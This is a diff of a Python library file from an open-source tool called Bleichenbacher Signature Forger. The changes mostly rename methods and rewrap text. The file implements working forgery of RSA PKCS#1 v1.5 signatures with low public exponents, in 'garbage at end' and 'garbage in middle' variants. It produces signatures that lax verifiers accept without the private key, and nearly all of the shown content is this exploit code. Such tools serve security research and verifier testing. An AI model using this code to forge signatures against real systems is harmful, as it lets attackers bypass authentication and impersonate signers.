@@ -4,57 +4,58 @@
 """
 This file is a library unit that exposes the "SignatureForger" class
 with two main methods:
-"forgeSignature_method_garbage_mid" and
-"forgeSignature_method_garbage_end".
+"forge_signature_with_garbage_mid" and
+"forge_signature_with_garbage_end".
 
 You should specify the public key when initializing the class.
-Then call one of these methods with a message argument, and it will
+Then, call one of these methods with a message argument, and it will
 return a valid signature of the given message without having a private key.
 
 You can find the code that uses this class in the "Forge.py" module:
-it gets the key, message and other arguments from the command line
+it gets the key, message, and other arguments from the command line
 and prints the generated signature.
 
 
-This file is part of Bleichenbacher Signature Forger v2.0.
+This file is part of Bleichenbacher Signature Forger v2.2.
 
 Copyright 2016 Filippo Valsorda
 Copyright 2017 Peter Hoeg Steffensen
 Copyright 2021 Maxim Masiutin
 
-Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
+Bleichenbacher Signature Forger is free software: you can redistribute it
+and/or modify it under the terms of the GNU General Public License as
+published by the Free Software Foundation, either version 3 of the License,
+or (at your option) any later version.
 
-Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
+Bleichenbacher Signature Forger is distributed in the hope that it will be
+useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General
+Public License for more details.
 
 You should have received a copy of the GNU General Public License
-along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
+along with Bleichenbacher Signature Forger.
+If not, see <https://www.gnu.org/licenses/>.
 """
 
 from sys import stderr, exit
 from os import urandom
 from gmpy2 import get_max_precision, get_context, root
-from HashInfo import Hash
+from HashInfoLib import Hash
 
 
-def getBitAt(idx, val):
+def get_bit_at(idx, val):
     return (val >> idx) & 0x01
 
 
-def setBitAt(idx, val):
+def set_bit_at(idx, val):
     return val | (0x01 << idx)
 
 
-def toInt(val):
+def to_int(val):
     return int.from_bytes(val, byteorder="big")
 
 
-def toBytes(val, arg_len):
+def to_bytes(val, arg_len):
     return int.to_bytes(val, length=arg_len, byteorder="big")
 
 
@@ -76,7 +77,7 @@ class SignatureForger:
             self.max_precision,
         )
 
-    def encodePkcs1Suffix(self, message):
+    def encode_pkcs1_suffix(self, message):
         messageHash = self.hashAlg.digester(message.encode("utf-8")).digest()
         if messageHash[-1] & 0x01 != 0x01:
             print(
@@ -87,27 +88,32 @@ class SignatureForger:
         suffix = bytes([0]) + self.hashAlg.digestInfo + messageHash
         return suffix
 
-    def constructSignatureSuffix(self, suffix):
+    def construct_signature_suffix(self, suffix):
         signatureSuffix = 1
-        int_suffix = toInt(suffix)
+        int_suffix = to_int(suffix)
         for idx in range(len(suffix) * 8):
-            if getBitAt(idx, pow(signatureSuffix, self.public_exponent)) != getBitAt(
+            if get_bit_at(idx, pow(signatureSuffix, self.public_exponent)) != get_bit_at(
                 idx, int_suffix
             ):
-                signatureSuffix = setBitAt(idx, signatureSuffix)
-        return toBytes(signatureSuffix, (signatureSuffix.bit_length() + 7) // 8)
+                signatureSuffix = set_bit_at(idx, signatureSuffix)
+        return to_bytes(signatureSuffix, (signatureSuffix.bit_length() + 7) // 8)
 
     def report_small(self, pbl):
+        ksb = self.keysize_bits
+        if ksb < pbl:
+            mesg = "bits and wraps past the modulus of"
+        else:
+            mesg = "bits and is too close to the size of the modulus of"
         print(
             "Key size is too small or the exponent is too big: the exponentiation of the signature gives",
             pbl,
-            "bis and wraps past the modulus of",
-            self.keysize_bits,
+            mesg,
+            ksb,
             "bits",
             file=stderr,
         )
 
-    def addPrefixToSignature(self, signatureSuffix):
+    def add_prefix_to_signature(self, signatureSuffix):
         progress = False
         precision = (self.keysize_bits + 7) // 16
         attempts = 0
@@ -118,24 +124,24 @@ class SignatureForger:
             attempts += 1
             testPrefix = prefix + urandom(self.keysize_bytes - len(prefix))
             signatureCandidate = (
-                toBytes(
-                    self.nthroot(
+                to_bytes(
+                    self.nth_root(
                         self.public_exponent,
-                        toInt(testPrefix),
+                        to_int(testPrefix),
                         self.limit_precision(precision),
                     ),
                     self.keysize_bytes,
                 )[: -len(signatureSuffix)]
                 + signatureSuffix
             )
-            sc = toInt(signatureCandidate)
+            sc = to_int(signatureCandidate)
             p = pow(sc, self.public_exponent)
             pbl = p.bit_length()
             if pbl > self.keysize_bits:
                 self.report_small(pbl)
                 return None
 
-            toCheck = toBytes(p, (pbl + 7) // 8)
+            toCheck = to_bytes(p, (pbl + 7) // 8)
             if 0 not in toCheck[: -len(signatureSuffix)]:
                 if progress:
                     if not self.quiet:
@@ -158,12 +164,12 @@ class SignatureForger:
                         print("")
                 return None
 
-    def nthroot(self, e, A, prec):
+    def nth_root(self, e, A, prec):
         get_context().precision = prec
         tu = root(A, e)
         return int(tu)
 
-    def forgeSignature_method_garbage_end(self, message):
+    def forge_signature_with_garbage_end(self, message):
         """
         Get message of type 'string' and return signature of type 'binary'.
         The signagure is generated according to the variant 1, with the garbage at the end of the message.
@@ -172,18 +178,19 @@ class SignatureForger:
         attempts = 0
         prefix = bytes([0x00, 0x01])
         prefix = prefix + ((bytes([0xFF])) * self.ffcount)
-        suffix = self.encodePkcs1Suffix(message)
-        value = prefix + suffix
-        numzeros = self.keysize_bytes - len(value)
+        suffix = self.encode_pkcs1_suffix(message)
+        encoded_digest = prefix + suffix
+        numzeros = self.keysize_bytes - len(encoded_digest)
         if numzeros < 1:
             print("The key size is too small", file=stderr)
             return None
-        plain = value + (bytes([0]) * numzeros)
-        plain_int = toInt(plain)
-        precision = len(value) * 8
+        plain = encoded_digest + (bytes([0]) * numzeros)
+        plain_int = to_int(plain)
+        encoded_digest_len_bits = len(encoded_digest) * 8
+        precision = encoded_digest_len_bits
         while True:
             attempts += 1
-            signature = self.nthroot(
+            signature = self.nth_root(
                 self.public_exponent, plain_int, self.limit_precision(precision)
             )
             plain2 = pow(signature, self.public_exponent)
@@ -192,19 +199,21 @@ class SignatureForger:
                 self.report_small(pbl)
                 return None
 
-            plain2_bytes = toBytes(plain2, self.keysize_bits)
-            if value in plain2_bytes:
+            plain2_bytes = to_bytes(plain2, self.keysize_bits)
+            exponentited_signature_len_bits = len(plain2_bytes) * 8
+
+            if encoded_digest in plain2_bytes:
                 break
-            if not self.quiet:
-                print("Trying to raise precision...")
+
             precision = precision * 2
             if attempts > 4:
+                self.report_small(pbl)
                 return None
 
         signature_bytes = (signature.bit_length() + 7) // 8
-        return toBytes(signature, signature_bytes)
+        return to_bytes(signature, signature_bytes)
 
-    def forgeSignature_method_garbage_mid(self, message):
+    def forge_signature_with_garbage_mid(self, message):
         """
         Get message of type 'string' and return signature of type 'binary'.
         The signagure is generated according to the variant 2, with the garbage in the middle of the message.
@@ -212,16 +221,16 @@ class SignatureForger:
         Credit for the variant 2 goes to Filippo Valsorda who publihed
         the original version of the code in 2016 (<https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/>)
         """
-        suffix = self.encodePkcs1Suffix(message)
-        signatureSuffix = self.constructSignatureSuffix(suffix)
-        signature = self.addPrefixToSignature(signatureSuffix)
+        suffix = self.encode_pkcs1_suffix(message)
+        signatureSuffix = self.construct_signature_suffix(suffix)
+        signature = self.add_prefix_to_signature(signatureSuffix)
         return signature
 
-    def forgeSignature(self, message, variant):
+    def forge_signature(self, message, variant):
         if variant == 1:
-            return self.forgeSignature_method_garbage_end(message)
+            return self.forge_signature_with_garbage_end(message)
         elif variant == 2:
-            return self.forgeSignature_method_garbage_mid(message)
+            return self.forge_signature_with_garbage_mid(message)
         else:
             raise ValueError(
                 "The value of the 'variant' parameter should be either 1 or 2"
